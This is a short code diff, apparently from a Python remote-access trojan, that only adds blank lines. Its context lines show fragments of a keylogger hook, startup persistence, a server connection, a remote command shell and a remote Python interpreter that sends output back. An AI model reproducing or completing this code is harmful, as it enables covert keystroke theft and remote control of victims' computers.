@@ -117,6 +117,7 @@ if blnAddToStartup: startup(True)
 
 server_connect()
 
+
 def OnKeyboardEvent(event):
     global strKeyLogs
 
@@ -270,6 +271,7 @@ def command_shell():
         time.sleep(0.1)
         send(bytData)  # send output
 
+
 def python_interpreter():
     send(b"received")
     while True:
@@ -295,6 +297,7 @@ def python_interpreter():
             send(strError.encode())
         else:
             send(redirected_output.getvalue().encode())
+
 
 def vbs_block_process(process, popup=False):
     # VBScript to block process, this allows the script to disconnect from the original python process, check github rep for source
